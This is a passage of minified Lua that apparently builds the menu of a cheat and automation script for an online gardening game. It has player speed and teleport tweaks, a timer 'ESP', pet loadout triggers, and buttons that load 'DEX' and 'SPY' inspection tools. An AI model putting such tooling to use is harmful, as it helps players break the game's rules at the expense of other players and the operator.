			g.TestGardenSync.C(G.Muted, "Plants: " .. (tostring(# V) .. (" | Single: " .. (tostring(j) .. (" | Fruits: " .. (tostring(y) .. (" | Ready: " .. (tostring(Z) .. (" | Events: " .. tostring(# g.TestGardenSync.Connections)))))))))),
			""
		}
		local c = tostring(g.TestGardenSync.WatchPlantId or "")
		if c ~= "" and g.TestGardenSync.Plants[c] then
			table.insert(i, g.TestGardenSync.FormatPlant(g.TestGardenSync.Plants[c]))
			return table.concat(i, "\n")
		end
		local J = 0
		for y, Z in ipairs(V) do
			J += 1
			if J > g.TestGardenSync.MaxPlants then
				table.insert(i, g.TestGardenSync.C(G.Muted, "... +" .. (tostring(# V - g.TestGardenSync.MaxPlants) .. " more plants. Select one from dropdown to watch live.")))
				break
			end
			table.insert(i, g.TestGardenSync.FormatPlant(Z))
			table.insert(i, "")
		end
		if # V == 0 then
			table.insert(i, g.TestGardenSync.C(G.Bad, "No plants loaded yet. Press Start / Refresh."))
		end
		return table.concat(i, "\n")
	end,
	Render = function()
		if not g.TestGardenSync.Label then
			return false
		end
		local G = g.TestGardenSync.BuildText()
		g.TestGardenSync.Label:SetText(G)
		return true
	end,
	BuildUi = function(G)
		if not G then
			return false
		end
		G:AddDivider()
		G:AddButton({
			Text = "Start Garden Sync Test";
			Func = function()
				g.TestGardenSync.Start()
			end
		})
		G:AddButton({
			Text = "Refresh Garden Snapshot",
			Func = function()
				g.TestGardenSync.Reset()
			end
		})
		G:AddButton({
			Text = "Stop Garden Sync Test",
			Func = function()
				g.TestGardenSync.Stop()
			end
		})
		g.TestGardenSync.Dropdown = G:AddDropdown("ddTestGardenSyncPlant", {
			Values = {},
			Default = {},
			Multi = false;
			Searchable = true;
			MaxVisibleDropdownItems = 10;
			Text = "Select Plant To Watch";
			Tooltip = "Shows one plant with live data-driven fruits",
			Callback = function(G)
				g.TestGardenSync.SetWatchPlant(G)
			end
		})
		g.TestGardenSync.Label = G:AddLabel({
			Text = "Press Start Garden Sync Test.";
			DoesWrap = true
		})
		g.TestGardenSync.RefreshPlantDropdown()
		return true
	end
}
g.SettingsUi = function()
	local G = d:AddTab({
		Name = "Settings",
		Description = "Settings",
		Icon = "settings"
	})
	local V = G:AddLeftGroupbox("Dev Tools", "align-center-horizontal")
	local j = G:AddRightGroupbox("<uc>Data</uc>", "blocks")
	local i = G:AddLeftGroupbox("Performance", "gauge")
	local c = G:AddRightGroupbox("Player UI", "blocks")
	local J = G:AddRightGroupbox("Farm Grid Debug", "grid-3x3")
	if c then
		c:AddToggle("hideplayerstats", {
			Text = "\226\132\185\239\184\143 Hide Exo Stats";
			Default = h.hide_log_ui;
			Tooltip = "Hides the stats info for systems.";
			Callback = function(G)
				h.hide_log_ui = G
				a.Save.SaveDataSync()
			end
		})
		c:AddToggle("hide_player_ui_toggle", {
			Text = "\240\159\145\129\239\184\143 Hide Plot & Teleport UI",
			Default = h.hide_player_ui;
			Tooltip = "Hides the plot panels and teleport buttons.";
			Callback = function(G)
				h.hide_player_ui = G
				Z.PlayerUI.Apply()
				a.Save.SaveDataSync()
			end
		})
	end
	if J then
		local G = J:AddLabel({
			Text = "Shows the farm placement grid. Blue spots are blocked.",
			DoesWrap = true
		})
		J:AddToggle("farm_grid_debug_show_labels", {
			Text = "Show Spot Labels",
			Default = Z.FarmGridDebug.ShowLabelsFarmGridDebug == true,
			Tooltip = "Shows numbers above farm grid dots.",
			Callback = function(G)
				Z.FarmGridDebug.SetLabelsVisibleFarmGridDebug(G)
			end
		})
		J:AddButton({
			Text = "Generate Farm Grid";
			Func = function()
				local V, y = Z.FarmGridDebug.GenerateFarmGridDebug()
				if G then
					G:SetText(tostring(y or "Grid generated"))
				end
				g.Notify(V and "Farm grid generated" or tostring(y or "Farm grid unavailable"), 3)
			end
		})
		J:AddButton({
			Text = "Clear Farm Grid";
			Func = function()
				Z.FarmGridDebug.ClearFarmGridDebug()
				if G then
					G:SetText("Farm grid cleared")
				end
			end
		})
	end
	if i then
		i:AddToggle("hide_plant_models_ui", {
			Text = "Remove Plants";
			Default = h.remove_plants;
			Tooltip = "Removes plant models to reduce game lag. Automation will continue working.";
			Callback = function(G)
				h.remove_plants = G
				a.Save.SaveDataSync()
			end
		})
		i:AddToggle("remove_Weatherx", {
			Text = "Remove Weathers Visuals";
			Default = h.remove_weather_visuals,
			Tooltip = "Removes weather visuals. Automation will continue working.";
			Callback = function(G)
				h.remove_weather_visuals = G
				a.Save.SaveDataSync()
			end
		})
		i:AddToggle("sprinkler_time_esp_enabled_ui", {
			Text = "Show Sprinkler Timer ESP";
			Default = h.sprinkler_time_esp_enabled == true;
			Tooltip = "Shows or hides the remaining time above placed sprinklers.",
			Callback = function(G)
				h.sprinkler_time_esp_enabled = G == true
				if h.sprinkler_time_esp_enabled then
					Z.SprinklerTimeEsp.RefreshSprinklerTimeEsp()
				else
					Z.SprinklerTimeEsp.ClearSprinklerTimeEsp()
				end
				a.Save.SaveDataSync()
			end
		})
		i:AddToggle("full_performance_mode_ui", {
			Text = "Full Performance Mode";
			Default = h.full_performance_mode;
			Tooltip = "Disables heavy visuals and lowers graphics for better performance.",
			Callback = function(G)
				h.full_performance_mode = G
				if Z.FullPerformanceMode then
					if G == true and type(Z.FullPerformanceMode.ApplyFullPerformanceMode) == "function" then
						Z.FullPerformanceMode.ApplyFullPerformanceMode()
					elseif G == false and type(Z.FullPerformanceMode.RestoreRenderSettingsFullPerformanceMode) == "function" then
						Z.FullPerformanceMode.RestoreRenderSettingsFullPerformanceMode()
					end
				end
				a.Save.SaveDataSync()
			end
		})
	end
	if j then
		local G = nil
		local V = ""
		local i = j:AddDropdown("ddDatalistsdsx1", {
			Values = {},
			Default = {},
			Multi = false;
			Searchable = true;
			MaxVisibleDropdownItems = 10,
			Text = "\240\159\148\146 Select Key",
			Tooltip = "Reads data based on key";
			Callback = function(j)
				if j == nil then
					return
				end
				V = j
				local i = Z.DataReplica.GetData(j)
				local c = y.HttpService:JSONEncode(i)
				if G then
					G:SetText(c)
				end
			end
		})
		j:AddButton({
			Text = "Copy",
			Func = function()
				if V == "" or V == nil then
					return
				end
				local G = Z.DataReplica.GetData(V)
				if G then
					local Z = y.HttpService:JSONEncode(G)
					local j = string.format("%s \n%s", V, Z)
					q.CopyToClipBoard(j)
				end
			end
		})
		G = j:AddLabel({
			Text = "--";
			DoesWrap = true
		})
		i:SetValues(Z.DataReplica.AllBigDataKeys)
		Z.GardenSyncDebug.BuildGardenSyncDebugUi(j)
	end
	if V then
		local G = V:AddButton({
			Text = "DEX";
			Func = function()
				q.LoadDexTool()
			end
		})
		local y = V:AddButton({
			Text = "SPY";
			Func = function()
				q.LoadSpyTool()
			end
		})
		V:AddDivider()
		V:AddDivider()
		V:AddDivider()
	end
end
g.TweaksUi = function()
	local G = d:AddTab({
		Name = "Tweaks",
		Description = "Customise system behaviour";
		Icon = "sliders-horizontal"
	})
	local V = G:AddLeftGroupbox("Movement", "move")
	if V then
		V:AddSlider("step_teleport_speed_ui", {
			Text = "Target Teleport Speed";
			Default = math.clamp(tonumber(h.step_teleport_speed) or 100, 25, 500);
			Min = 25,
			Max = 500;
			Rounding = 0;
			Suffix = "%",
			Tooltip = "Higher values reduce the brief wait after moving to a target.";
			Callback = function(G)
				local V = math.clamp(tonumber(G) or 100, 25, 500)
				h.step_teleport_speed = V
				Z.TargetPivotTeleport.SetSpeedTargetPivotTeleport(V)
				Z.StepTeleport.StepDelay = Z.TargetPivotTeleport.SettleDelayTargetPivotTeleport
				a.Save.SaveDataSync()
			end
		})
		V:AddLabel({
			Text = "100% is the recommended default speed.";
			DoesWrap = true
		})
		V:AddToggle("player_speed_enabled_ui", {
			Text = "\226\154\161 Player Speed",
			Default = h.player_speed_enabled,
			Tooltip = "Keeps your movement speed at the selected minimum.",
			Callback = function(G)
				h.player_speed_enabled = G
				Z.PlayerSpeed.ApplyPlayerSpeed()
				a.Save.SaveDataSync()
			end
		})
		V:AddSlider("player_speed_value_ui", {
			Text = "Player Speed";
			Default = math.clamp(tonumber(h.player_speed_value) or 80, 16, 160),
			Min = 16;
			Max = 160;
			Rounding = 0,
			Suffix = "",
			Tooltip = "Higher speed helps player-walk movement reach targets faster.";
			Callback = function(G)
				h.player_speed_value = math.clamp(tonumber(G) or 80, 16, 160)
				Z.PlayerSpeed.ApplyPlayerSpeed()
				a.Save.SaveDataSync()
			end
		})
	end
end
g.PetEquipTriggersUi = function()
	local G = d:AddTab({
		Name = "<font color=\"#FFFFFF\">Pet </font><font color=\"#00A2FF\">Triggers</font>";
		Description = "Pet loadouts for events";
		Icon = "paw-print"
	})
	local V = G:AddLeftGroupbox("Pet Trigger Settings", "settings", false)
	local y = G:AddLeftGroupbox("Create Loadout", "plus-circle", false)
	local j = G:AddRightGroupbox("Saved Loadouts", "list-checks", false)
	local i = G:AddRightGroupbox("Trigger Logs", "scroll-text", false)
	if V then
		V:AddLabel({
			Text = "Idle runs when no stronger event is active. Manual only runs when you press Run Manual Now.";
			DoesWrap = true
		})
		V:AddToggle("pet_equip_enabled_ui", {
			Text = "\240\159\144\190 Enable Pet Triggers";
			Default = h.pet_equip_enabled,
			Tooltip = "Runs enabled loadouts when their trigger is active.";
			Callback = function(G)
				h.pet_equip_enabled = G
				a.Save.SaveDataSync()
				Z.PetEquipTriggers.ProcessPetEquipTriggers()
			end
		})
		V:AddToggle("pet_equip_restore_previous_ui", {
			Text = "\226\134\169\239\184\143 Restore Previous Pets";
			Default = h.pet_equip_restore_previous;
			Tooltip = "Restores the pets equipped before the trigger started.",
			Callback = function(G)
				h.pet_equip_restore_previous = G
				a.Save.SaveDataSync()
			end
		})
		V:AddToggle("pet_equip_log_enabled_ui", {
			Text = "\240\159\167\190 Log Trigger Events";
			Default = h.pet_equip_log_enabled;
			Tooltip = "Stores the latest trigger events in the log group.",
			Callback = function(G)
				h.pet_equip_log_enabled = G
				a.Save.SaveDataSync()
			end
		})
		V:AddButton({
			Text = "\226\134\169\239\184\143 Restore Previous Now";
			Func = function()
				Z.PetEquipTriggers.RestorePreviousPetEquipTriggers("Manual restore")
			end
		})
		V:AddDivider()
		V:AddToggle("pet_equip_protect_rainbow_ui", {
			Text = "\240\159\140\136 Never Unequip Rainbow";
			Default = h.pet_equip_protect_rainbow,
			Tooltip = "Rainbow pets are kept equipped when possible.";
			Callback = function(G)
				h.pet_equip_protect_rainbow = G
				a.Save.SaveDataSync()
			end
		})
		V:AddToggle("pet_equip_protect_big_huge_ui", {
			Text = "\240\159\147\143 Never Unequip Big/Huge";
			Default = h.pet_equip_protect_big_huge,
			Tooltip = "Big and Huge pets are kept equipped when possible.";
			Callback = function(G)
				h.pet_equip_protect_big_huge = G
				a.Save.SaveDataSync()
			end
		})
		V:AddToggle("pet_equip_protect_super_secret_ui", {
			Text = "\240\159\146\142 Never Unequip Super/Secret",
			Default = h.pet_equip_protect_super_secret;
			Tooltip = "Super and Secret pets are kept equipped when possible.";
			Callback = function(G)
				h.pet_equip_protect_super_secret = G
				a.Save.SaveDataSync()
			end
		})
		local G
		G = V:AddValueDropdown("pet_equip_protected_names_ui", {
			Values = Z.PetEquipTriggers.GetPetNameDropdownPetEquipTriggers();
			Default = h.pet_equip_protected_names;
			Multi = true,
			Searchable = true,
			MaxVisibleDropdownItems = 10,
			Text = "\240\159\155\161\239\184\143 Protect Pet Types";
			Tooltip = "Selected pet types will not be unequipped by triggers.";
			Callback = function(G)
				if G == nil then
					return
				end
				h.pet_equip_protected_names = G
				a.Save.SaveDataSync()
			end
		})
		local y
		y = V:AddValueDropdown("pet_equip_protected_ids_ui", {
			Values = Z.PetEquipTriggers.GetExactPetDropdownPetEquipTriggers(),
			Default = h.pet_equip_protected_ids,
			Multi = true,
			Searchable = true;
			MaxVisibleDropdownItems = 10,
			Text = "\240\159\148\144 Protect Exact Pets";
			Tooltip = "Selected exact pets will not be unequipped by triggers.";
			Callback = function(G)
				if G == nil then
					return
				end
				h.pet_equip_protected_ids = G
				a.Save.SaveDataSync()
			end
		})
		V:AddButton({
			Text = "\240\159\148\132 Refresh Pet Lists",
			Func = function()
				if G then
					G:SetValues(Z.PetEquipTriggers.GetPetNameDropdownPetEquipTriggers())
				end
				if y then
					y:SetValues(Z.PetEquipTriggers.GetExactPetDropdownPetEquipTriggers())
				end
				if G then
					G:SetValue(h.pet_equip_protected_names, true)
				end
				if y then
					y:SetValue(h.pet_equip_protected_ids, true)
				end
			end
		})
	end
	if j then
		local G = {}
		g.PetEquipTriggerUi.RefreshingRules = false
		j:AddLabel({
			Text = "Loadouts are created only after Save Loadout. Manual loadouts need Run Manual Now.",
			DoesWrap = true
		})
		local function V(G, V)
			if type(G) ~= "table" then
				return
			end
			if G.Toggle then
				G.Toggle:SetVisible(V)
			end
			if G.RunButton then
				G.RunButton:SetVisible(V)
			end
			if G.DeleteButton then
				G.DeleteButton:SetVisible(V)
			end
			if G.Divider then
				G.Divider:SetVisible(V)
			end
		end
		local function y(y)
			if type(y) ~= "table" then
				return nil
			end
			local i = tostring(y.id or "")
			if i == "" then
				return nil
			end
			local c = G[i]
			if not c then
				c = {
					ruleId = i
				}
				c.Toggle = j:AddToggle("pet_equip_rule_toggle_" .. i, {
					Text = Z.PetEquipTriggers.GetRuleSummaryPetEquipTriggers(y),
					Default = y.enabled == true;
					Tooltip = "Enable or disable this saved loadout.",
					Callback = function(G)
						if g.PetEquipTriggerUi.RefreshingRules then
							return
						end
						Z.PetEquipTriggers.ToggleRulePetEquipTriggers(i, G)
					end
				})
				c.RunButton = j:AddButton({
					Text = tostring(y.triggerType or "") == "Manual" and "\226\150\182 Run Manual Now" or "\226\150\182 Auto Trigger Only";
					Func = function()
						local G = (Z.PetEquipTriggers.GetRulesTablePetEquipTriggers())[i]
						if type(G) ~= "table" then
							g.Notify("Loadout not found", 2)
							return
						end
						if tostring(G.triggerType or "") ~= "Manual" then
							g.Notify("Only manual loadouts use Run Manual Now", 2)
							return
						end
						Z.PetEquipTriggers.TriggerManualPetEquipTriggers(i)
					end
				})
				c.DeleteButton = j:AddButton({
					Text = "\240\159\151\145 Delete Loadout",
					Func = function()
						Z.PetEquipTriggers.RemoveRulePetEquipTriggers(i)
					end
				})
				c.Divider = j:AddLabel({
					Text = "<font color=\'#444444\'>\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128</font>",
					DoesWrap = false
				})
				G[i] = c
			end
			V(c, true)
			c.Toggle:SetText(Z.PetEquipTriggers.GetRuleSummaryPetEquipTriggers(y))
			c.Toggle:SetValue(y.enabled == true)
			c.RunButton:SetText(tostring(y.triggerType or "") == "Manual" and "\226\150\182 Run Manual Now" or "\226\150\182 Auto Trigger Only")
			return c
		end
		g.PetEquipTriggerUi.RefreshPetEquipRules = function()
			g.PetEquipTriggerUi.RefreshingRules = true
			local j = {}
			for G, V in ipairs(Z.PetEquipTriggers.GetSortedRulesPetEquipTriggers()) do
				local Z = tostring(V.id or "")
				if Z ~= "" then
					j[Z] = true
					y(V)
				end
			end
			for G, y in pairs(G) do
				if not j[G] then
					V(y, false)
				end
			end
			g.PetEquipTriggerUi.RefreshingRules = false
		end
		j:AddButton({
			Text = "\240\159\148\132 Refresh Loadouts",
			Func = function()
				g.PetEquipTriggerUi.RefreshPetEquipRules()
			end
		})
	end
	if y then
		local G = {
			name = "Pet Loadout";
			triggerType = "Manual",
			triggerName = "Manual",
			duration = 0;
			pets = {}
		}
		y:AddInput("pet_equip_rule_name_input_ui", {
			Text = "Loadout Name";
			Default = G.name;
			Numeric = false;
			AllowEmpty = false,
			Finished = true,
			ClearTextOnFocus = false,
			Placeholder = "Loadout name",
			Tooltip = "Name shown in the saved loadout list.",
			Callback = function(V)
				G.name = Z.PetEquipTriggers.CleanRuleNamePetEquipTriggers(V)
			end
		})
		local V
		local j
		local function i()
			local V = Z.PetEquipTriggers.GetTriggerOptionsPetEquipTriggers(G.triggerType)
			G.triggerName = V[1] or "Manual"
			if j then
				j:SetValues(V)
				j:SetValue(G.triggerName, true)
			end
		end
		V = y:AddDropdown("pet_equip_trigger_type_ui", {
			Values = {
				"Manual",
				"Default";
				"Time Cycle",
				"Weather",
				"Seed Pack";
				"Dropped Seed"
			},
			Default = G.triggerType;
			Multi = false,
			Text = "Trigger Type";
			Tooltip = "Choose when this loadout should run.",
			Callback = function(V)
				G.triggerType = tostring(V or "Manual")
				i()
			end
		})
		j = y:AddDropdown("pet_equip_trigger_on_ui", {
			Values = Z.PetEquipTriggers.GetTriggerOptionsPetEquipTriggers(G.triggerType);
			Default = G.triggerName,
			Multi = false,
			Text = "Trigger On",
			Tooltip = "Choose the event that activates this loadout.";
			Callback = function(V)
				G.triggerName = tostring(V or "Manual")
			end
		})
		y:AddInput("pet_equip_duration_input_ui", {
			Text = "Duration Seconds (0 = event/manual)",
			Default = "0",
			Numeric = true,
			AllowEmpty = false,
			Finished = true,
			ClearTextOnFocus = false,
			Placeholder = "0";
			Tooltip = "0 keeps event loadouts until the event ends. Manual 0 stays until restore.";
			Callback = function(V)
				G.duration = math.max(math.floor(tonumber(V) or 0), 0)
			end
		})
		y:AddDivider()
		local c = ""
		local J = 1
		local T = ""
		local d = ""
		y:AddValueDropdown("pet_equip_pet_type_ui", {
			Values = Z.PetEquipTriggers.GetPetNameDropdownPetEquipTriggers();
			Default = "";
			Multi = false;
			Searchable = true,
			MaxVisibleDropdownItems = 10;
			Text = "Pet Type",
			Tooltip = "Choose the pet type to add to the loadout.";
			Callback = function(G)
				c = tostring(G or "")
			end
		})
		y:AddInput("pet_equip_pet_amount_input_ui", {
			Text = "Pet Amount";
			Default = "1";
			Numeric = true,
			AllowEmpty = false,
			Finished = true,
			ClearTextOnFocus = false,
			Placeholder = "1",
			Tooltip = "Amount to try equipping. Extra pets are ignored if you have no free slots.",
			Callback = function(G)
				J = math.clamp(math.floor(tonumber(G) or 1), 1, 12)
			end
		})
		y:AddDropdown("pet_equip_pet_size_ui", {
			Values = {
				"Any",
				"Normal",
				"Big",
				"Huge"
			};
			Default = "Any";
			Multi = false;
			Text = "Optional Size";
			Tooltip = "Optional pet size filter.";
			Callback = function(G)
				G = tostring(G or "Any")
				T = G == "Any" and "" or G
			end
		})
		y:AddDropdown("pet_equip_pet_variant_ui", {
			Values = {
				"Any",
				"Normal",
				"Rainbow"
			};
			Default = "Any",
			Multi = false,
			Text = "Optional Variant",
			Tooltip = "Optional pet variant filter.",
			Callback = function(G)
				G = tostring(G or "Any")
				d = G == "Any" and "" or G
			end
		})
		local u = y:AddLabel({
			Text = "Pending Pets: none";
			DoesWrap = true
		})
		local function q()
			local V = {}
			for G, y in ipairs(G.pets) do
				local j = Z.PetEquipTriggers.GetPetDisplayNamePetEquipTriggers(y.pet)
				local i = {}
				if tostring(y.size or "") ~= "" then
					table.insert(i, tostring(y.size))
				end
				if tostring(y.variant or "") ~= "" then
					table.insert(i, tostring(y.variant))
				end
				local c = # i > 0 and " [" .. (table.concat(i, ", ") .. "]") or ""
				table.insert(V, j .. (" x" .. (tostring(y.amount or 1) .. c)))
			end
			u:SetText(# V > 0 and "Pending Pets:\n" .. table.concat(V, "\n") or "Pending Pets: none")
		end
		y:AddButton({
			Text = "\226\158\149 Add Pet To Pending",
			Func = function()
				local V = Z.PetEquipTriggers.ResolvePetNamePetEquipTriggers(c)
				if V == "" then
					g.Notify("Select a pet type first", 2)
					return
				end
				table.insert(G.pets, {
					pet = V,
					amount = J;
					size = T,
					variant = d
				})
				q()
			end
		})
		y:AddButton({
			Text = "\240\159\167\185 Clear Pending Pets",
			Func = function()
				table.clear(G.pets)
				q()
			end
		})
		y:AddButton({
			Text = "\226\156\133 Save Loadout";
			Func = function()
				local V, y = Z.PetEquipTriggers.AddRulePetEquipTriggers(G.name, G.triggerType, G.triggerName, G.duration, G.pets)
				if V then
					g.Notify("Loadout saved", 2)
					table.clear(G.pets)
					q()
					if g.PetEquipTriggerUi.RefreshPetEquipRules then
						g.PetEquipTriggerUi.RefreshPetEquipRules()
					end
					Z.PetEquipTriggers.ProcessPetEquipTriggers()
				else
					g.Notify(tostring(y or "Could not save loadout"), 3)
				end
			end
		})
	end
	if j and g.PetEquipTriggerUi.RefreshPetEquipRules then
		g.PetEquipTriggerUi.RefreshPetEquipRules()
	end
	if i then
		local G = i:AddLabel({
			Text = "No logs yet",
			DoesWrap = true
		})
		g.PetEquipTriggerUi.RefreshPetEquipLogs = function()
			local V = {}
			for G, y in ipairs(g.PetEquipTriggerLogs) do
				if G > 50 then
					break
				end
				table.insert(V, y)
			end
			G:SetText(# V > 0 and table.concat(V, "\n") or "No logs yet")
		end
		i:AddButton({
			Text = "\240\159\167\185 Clear Logs";
			Func = function()
				table.clear(g.PetEquipTriggerLogs)
				g.PetEquipTriggerUi.RefreshPetEquipLogs()
			end
		})
		g.PetEquipTriggerUi.RefreshPetEquipLogs()
	end
end
g.PetTriggersV2Ui = function()
	local G = d:AddTab({
		Name = "<font color=\"#FFFFFF\">Pet </font><font color=\"#00FF88\">Triggers v2</font>",
		Description = "Simple pet trigger rules",
		Icon = "rabbit"
	})
	local V = G:AddLeftGroupbox("Pet Triggers v2", "settings", false)
	local y = G:AddLeftGroupbox("Create Trigger", "plus-circle", false)
	local j = G:AddRightGroupbox("Saved Triggers", "list-checks", false)
	local i = G:AddRightGroupbox("Priority", "list-ordered", false)
	if V then
		V:AddLabel({
			Text = "v2 is separate from the old Pet Triggers tab. Default is the fallback. Time Cycle supports multiple selected events. Pet Buy runs while a pet is being bought.";
			DoesWrap = true
		})
		V:AddToggle("pet_triggers_v2_enabled_ui", {
			Text = "\240\159\144\135 Enable Pet Triggers v2";
			Default = h.pet_triggers_v2_enabled,
			Tooltip = "Runs enabled v2 triggers by priority.";
			Callback = function(G)
				h.pet_triggers_v2_enabled = G
				a.Save.SaveData()
				Z.PetTriggersV2.ProcessPetTriggersV2()
			end
		})
		V:AddButton({
			Text = "\240\159\148\132 Refresh Now";
			Func = function()
				if g.PetTriggersV2UiState.RefreshRulesPetTriggersV2 then
					g.PetTriggersV2UiState.RefreshRulesPetTriggersV2()
				end
				Z.PetTriggersV2.ProcessPetTriggersV2()
			end
		})
	end
	if i then
		i:AddLabel({
			Text = "<font color=\'#FFAA00\'>Pet Buy = 90</font>\n<font color=\'#66CCFF\'>Time Cycle = 70</font>\n<font color=\'#CFCFCF\'>Default = 10</font>";
			DoesWrap = true
		})
		i:AddLabel({
			Text = "Speed category equips Bunny pets best-first: Huge, then Big, then Normal, up to your unlocked pet slots.",
			DoesWrap = true
		})
	end
	if j then
		local G = {}
		g.PetTriggersV2UiState.RefreshingRulesPetTriggersV2 = false
		j:AddLabel({
			Text = "Each saved trigger has its own enable toggle and delete button.";
			DoesWrap = true
		})
		local function V(G, V)
			if type(G) ~= "table" then
				return
			end
			if G.Toggle then
				G.Toggle:SetVisible(V)
			end
			if G.DeleteButton then
				G.DeleteButton:SetVisible(V)
			end
			if G.Divider then
				G.Divider:SetVisible(V)
			end
		end
		local function y(y)
			if type(y) ~= "table" then
				return nil
			end
			local i = tostring(y.id or "")
			if i == "" then
				return nil
			end
			local c = G[i]
			if not c then
				c = {
					ruleId = i
				}
				c.Toggle = j:AddToggle("pet_triggers_v2_rule_toggle_" .. i, {
					Text = Z.PetTriggersV2.GetRuleSummaryPetTriggersV2(y);
					Default = y.enabled == true;
					Tooltip = "Enable or disable this trigger.";
					Callback = function(G)
						if g.PetTriggersV2UiState.RefreshingRulesPetTriggersV2 then
							return
						end
						Z.PetTriggersV2.ToggleRulePetTriggersV2(i, G)
					end
				})
				c.DeleteButton = j:AddButton({
					Text = "\240\159\151\145 Delete Trigger",
					Func = function()
						Z.PetTriggersV2.RemoveRulePetTriggersV2(i)
					end
				})
				c.Divider = j:AddLabel({
					Text = "<font color=\'#444444\'>\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128</font>",
					DoesWrap = false
				})
				G[i] = c
			end
			V(c, true)
			c.Toggle:SetText(Z.PetTriggersV2.GetRuleSummaryPetTriggersV2(y))
			c.Toggle:SetValue(y.enabled == true)
			return c
		end
		g.PetTriggersV2UiState.RefreshRulesPetTriggersV2 = function()
			g.PetTriggersV2UiState.RefreshingRulesPetTriggersV2 = true
			local j = {}
			for G, V in ipairs(Z.PetTriggersV2.GetSortedRulesPetTriggersV2()) do
				local Z = tostring(V.id or "")
				if Z ~= "" then
					j[Z] = true
					y(V)
				end
			end
			for G, y in pairs(G) do
				if not j[G] then
					V(y, false)
				end
			end
			g.PetTriggersV2UiState.RefreshingRulesPetTriggersV2 = false
		end
		j:AddButton({
			Text = "\240\159\148\132 Refresh Triggers",
			Func = function()
				g.PetTriggersV2UiState.RefreshRulesPetTriggersV2()
			end
		})
	end
	if y then
		local G = {
			triggerType = "Default";
			events = {},
			loadoutMode = "Speed",
			pets = {}
		}
		local V
		local j
		local i
		local c = ""
		local J = 1
		local T = ""
		local d = ""
		y:AddDropdown("pet_triggers_v2_trigger_type_ui", {
			Values = {
				"Default",
				"Time Cycle",
				"Pet Buy"
			};
			Default = G.triggerType,
			Multi = false;
			Text = "\226\154\161 Trigger",
			Tooltip = "Choose the trigger priority type.";
			Callback = function(V)
				G.triggerType = tostring(V or "Default")
			end
		})
		V = y:AddValueDropdown("pet_triggers_v2_events_ui", {
			Values = Z.PetTriggersV2.GetEventDropdownPetTriggersV2();
			Default = {};
			Multi = true,
			Searchable = true;
			MaxVisibleDropdownItems = 10,
			Text = "\240\159\140\153 Time Cycle Events";
			Tooltip = "Only used for Time Cycle. Select one or multiple events.";
			Changed = function(V)
				G.events = type(V) == "table" and V or {}
			end
		})
		y:AddDropdown("pet_triggers_v2_loadout_mode_ui", {
			Values = {
				"Speed";
				"Manual"
			},
			Default = G.loadoutMode,
			Multi = false,
			Text = "\240\159\144\190 Pet Mode";
			Tooltip = "Speed chooses Bunny pets automatically. Manual uses the pending pet list.",
			Callback = function(V)
				G.loadoutMode = tostring(V or "Speed")
			end
		})
		y:AddDivider()
		j = y:AddValueDropdown("pet_triggers_v2_pet_type_ui", {
			Values = Z.PetTriggersV2.GetPetDropdownPetTriggersV2();
			Default = "",
			Multi = false;
			Searchable = true;
			MaxVisibleDropdownItems = 10,
			Text = "Manual Pet Type",
			Tooltip = "Used only when Pet Mode is Manual.";
			Callback = function(G)
				c = tostring(G or "")
			end
		})
		y:AddInput("pet_triggers_v2_pet_amount_ui", {
			Text = "Manual Pet Amount",
			Default = "1";
			Numeric = true;
			AllowEmpty = false;
			Finished = true,
			ClearTextOnFocus = false,
			Placeholder = "1",
			Tooltip = "Used only when Pet Mode is Manual.",
			Callback = function(G)
				J = math.clamp(math.floor(tonumber(G) or 1), 1, 12)
			end
		})
		y:AddDropdown("pet_triggers_v2_pet_size_ui", {
			Values = {
				"Any",
				"Normal",
				"Big";
				"Huge"
			};
			Default = "Any";
			Multi = false;
			Text = "Manual Size",
			Tooltip = "Optional size filter for manual pets.",
			Callback = function(G)
				G = tostring(G or "Any")
				T = G == "Any" and "" or G
			end
		})
		y:AddDropdown("pet_triggers_v2_pet_variant_ui", {
			Values = {
				"Any";
				"Normal",
				"Rainbow"
			};
			Default = "Any";
			Multi = false,
			Text = "Manual Variant";
			Tooltip = "Optional variant filter for manual pets.",
			Callback = function(G)
				G = tostring(G or "Any")
				d = G == "Any" and "" or G
			end
		})
		i = y:AddLabel({
			Text = "Pending Manual Pets: none",
			DoesWrap = true
		})
		local function u()
			local V = {}
			for G, y in ipairs(G.pets) do
				local j = Z.PetTriggersV2.GetPetDisplayNamePetTriggersV2(y.pet)
				local i = {}
				if tostring(y.size or "") ~= "" then
					table.insert(i, tostring(y.size))
				end
				if tostring(y.variant or "") ~= "" then
					table.insert(i, tostring(y.variant))
				end
				table.insert(V, j .. (" x" .. (tostring(y.amount or 1) .. ((# i > 0 and " [" .. (table.concat(i, ", ") .. "]") or "")))))
			end
			i:SetText(# V > 0 and "Pending Manual Pets:\n" .. table.concat(V, "\n") or "Pending Manual Pets: none")
		end
		y:AddButton({
			Text = "\226\158\149 Add Manual Pet",
			Func = function()
				local V = Z.PetTriggersV2.ResolvePetNamePetTriggersV2(c)
				if V == "" then
					g.Notify("Select a pet type first", 2)
					return
				end
				table.insert(G.pets, {
					pet = V;
					amount = J,
					size = T;
					variant = d
				})
				u()
			end
		})
		y:AddButton({
			Text = "\240\159\167\185 Clear Manual Pets";
			Func = function()
				table.clear(G.pets)
				u()
			end
		})
		y:AddButton({
			Text = "\226\156\133 Save Trigger";
			Func = function()
				local y, j = Z.PetTriggersV2.AddRulePetTriggersV2(G.triggerType, G.events, G.loadoutMode, G.pets)
				if y then
					g.Notify("Pet trigger saved", 2)
					G.events = {}
					table.clear(G.pets)
					if V then
						V:SetValue({}, true)
					end
					u()
					Z.PetTriggersV2.ProcessPetTriggersV2()
				else
					g.Notify(tostring(j or "Could not save trigger"), 3)
				end
			end
		})
		y:AddButton({
			Text = "\240\159\148\132 Refresh Event/Pet Lists";
			Func = function()
				if V then
					V:SetValues(Z.PetTriggersV2.GetEventDropdownPetTriggersV2())
				end
				if j then
					j:SetValues(Z.PetTriggersV2.GetPetDropdownPetTriggersV2())
				end
			end
		})
	end
	if j and g.PetTriggersV2UiState.RefreshRulesPetTriggersV2 then
		g.PetTriggersV2UiState.RefreshRulesPetTriggersV2()
	end
end
